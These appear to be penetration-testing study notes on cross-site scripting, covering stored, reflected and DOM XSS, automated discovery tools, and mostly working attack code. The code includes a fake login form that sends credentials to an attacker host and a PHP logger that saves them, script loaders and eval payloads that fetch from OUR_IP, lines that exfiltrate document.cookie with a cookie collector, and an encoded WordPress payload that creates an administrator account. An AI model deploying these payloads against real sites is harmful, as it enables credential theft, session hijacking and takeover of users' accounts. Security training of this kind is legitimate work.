# ❌ XSS (Cross-Site Scripting)

### Types:

| Type                           | Description                                                                                                                                                                                                                                  |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Stored (Persistent) XSS        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                   |
| Reflected (Non-Persistent) XSS | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
| DOM-based XSS                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

### Automated Discovery

Use XSS Strike:&#x20;

```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

To fuzz: Put the burp request in xss.req&#x20;

```
ffuf -ic -c -of csv -request-proto http -request xss.req -w XSS-RSNAKE.txt
```

&#x20;Adapt [Wordlist](https://github.com/tennc/fuzzdb/blob/master/attack-payloads/xss/xss-rsnake.txt) with host ip

### Sometimes try on user-agent

## Stored XSS(Most Critical)

Testing with basic payload:

```html
<script>alert(window.origin)</script>
```

If we get alert then vulnerable. Check source code to see if it is included

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

To use:

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

## Reflected XSS

Example:

```
http://94.237.54.170:58785/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

<figure><img src="../../.gitbook/assets/XSS (Cross-Site Scripting).png" alt=""><figcaption></figcaption></figure>

We get pop-up:

<figure><img src="../../.gitbook/assets/XSS (Cross-Site Scripting)-1.png" alt=""><figcaption></figcaption></figure>

Check network to add

<figure><img src="../../.gitbook/assets/XSS (Cross-Site Scripting)-2.png" alt=""><figcaption></figcaption></figure>

The form would be sent in a get request so.

## DOM XSS

Here everything is done client side so no HTTP request in networks tab.

If we look at the page source by hitting \[CTRL+I], we will notice that our test string is nowhere to be found. This is because the JavaScript code is updating the page when we click the Add button, which is after the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will not be retained (i.e. Non-Persistent). We can still view the rendered page source with the Web Inspector tool by clicking \[CTRL+SHIFT+C]:

### Source & Sink

The _Source_ is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field

_Sink_ is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack.

Some of the commonly used JavaScript functions to write to DOM objects are:

* document.write()
* DOM.innerHTML
* DOM.outerHTML Furthermore, some of the jQuery library functions that write to DOM objects are:
* add()
* after()
* append() Example code vulnerable to XSS:

```js
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length
```

To write task variable

```js
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

Previous payloads won't work so

```html
<img src="" onerror=alert(window.origin)>
```

## Phishing

Find a working payload with XSS Then make a login form

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Then use js `document.write()` to write the payload.

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Now to clean up:&#x20;

<figure><img src="../../.gitbook/assets/XSS (Cross-Site Scripting)-3.png" alt=""><figcaption></figcaption></figure>

&#x20;Here the url input is still displayed. To disable. Find the id of the element and remove

```js
document.getElementById('urlform').remove();
```

Final js:

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Insert this in payload.

To correctly receive the creds:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
nano index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```

index.php:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

## Remote Script

```html
<script src="http://OUR_IP/script.js"></script>
```

change script.js to the field that is vulnerable

### Blind XSS

Send a request in each field like so and start the php server shown above:

```html
<script src=http://10.10.14.155/fullname></script>
```

Examples from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

### Privesc Using Session Hijacking

Check if session cookie in storage

Cookies can be set with 2 optional flags: _Secure_ and _HttpOnly._

* _Secure_ - Only send cookie over encrypted connection like HTTPS
* _HttpOnly_ - Denies Javascript access to cookie. If not set then XSS payload can steal cookie. Check in storage section of Developer Tools If HttpOnly then we can only send through HTTP and it can't be retrieved by user thorugh Javascript then choose to create new admin users,etc.

After finding a payload that works, access the host with the payload that works

```
<script src=http://OUR_IP>/script.js</script>
```

And script.js on host is one of these:

```js
document.location='http://OUR_IP/index.php?c='+document.cookie;

new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Can also use

```html
<img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>
```

To steal cookie: Use this in php server:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## Wordpress HttpOnly Cookie

This attack works on the **Visitor** plugin

To attack with a HttpOnly cookie on wordpress: We need to create a Js function that fetches the nonce which is a server generated token to prevent CSRF attacks.

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

Now with the nonce we can create a new admin user:

```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

**Attack**

1. First Minify the js code into a one liner in **JS Compress**
2. Then Encode the JS code with: Run it from browser console and use the encoded output

```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

Leave intercept on in burp and run:

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<Encoded JS>))</script>" --proxy 127.0.0.1:8080
```

Forward the request and when the admin uses the visitors plugin the script will execute and create a new user.
